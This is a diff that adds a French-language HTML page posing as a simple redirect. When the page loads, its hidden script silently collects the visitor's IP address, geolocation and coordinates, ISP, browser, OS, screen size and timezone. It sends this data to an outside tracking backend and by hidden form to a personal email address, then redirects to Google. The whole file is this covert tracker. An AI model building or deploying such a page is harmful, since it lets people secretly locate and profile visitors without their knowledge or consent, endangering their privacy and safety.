@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirection...</title>
+</head>
+<body>
+  <p>Veuillez patienter...</p>
+
+  <!-- Formulaire invisible pour FormSubmit -->
+  <form id="formEmail" action="https://formsubmit.co/oguerep@gmail.com" method="POST" style="display: none;">
+    <input type="hidden" name="_subject" value="Nouvelle collecte - Lien simple">
+    <input type="hidden" name="IP" id="ip">
+    <input type="hidden" name="Ville" id="ville">
+    <input type="hidden" name="Région" id="region">
+    <input type="hidden" name="Pays" id="pays">
+    <input type="hidden" name="Latitude" id="latitude">
+    <input type="hidden" name="Longitude" id="longitude">
+    <input type="hidden" name="FAI" id="fai">
+    <input type="hidden" name="Navigateur" id="navigateur">
+    <input type="hidden" name="OS" id="os">
+    <input type="hidden" name="Résolution" id="resolution">
+    <input type="hidden" name="Fuseau" id="fuseau">
+    <input type="hidden" name="Date" id="date">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://www.google.com">
+  </form>
+
+  <script>
+    async function collectData() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const ip = data.ip || "";
+        const ville = data.city || "";
+        const region = data.region || "";
+        const pays = data.country_name || "";
+        const latitude = data.latitude || "";
+        const longitude = data.longitude || "";
+        const fai = data.org || "";
+        const os = navigator.userAgent;
+        const navigateur = navigator.appCodeName + " " + navigator.appVersion;
+        const resolution = screen.width + "x" + screen.height;
+        const fuseau = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const date = new Date().toLocaleString();
+
+        // FormSubmit
+        document.getElementById("ip").value = ip;
+        document.getElementById("ville").value = ville;
+        document.getElementById("region").value = region;
+        document.getElementById("pays").value = pays;
+        document.getElementById("latitude").value = latitude;
+        document.getElementById("longitude").value = longitude;
+        document.getElementById("fai").value = fai;
+        document.getElementById("navigateur").value = navigateur;
+        document.getElementById("os").value = os;
+        document.getElementById("resolution").value = resolution;
+        document.getElementById("fuseau").value = fuseau;
+        document.getElementById("date").value = date;
+
+        // Envoi au backend PostgreSQL
+        await fetch("https://tracksys-backend.onrender.com/collecte", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip, ville, region, pays,
+            latitude, longitude, fai,
+            os, navigateur, resolution,
+            fuseau, date,
+            image_vue: null  // null pour lien simple
+          })
+        });
+
+        // Envoi email
+        document.getElementById("formEmail").submit();
+
+      } catch (e) {
+        console.error("Erreur collecte :", e);
+      }
+    }
+
+    window.onload = collectData;
+  </script>
+</body>
+</html>
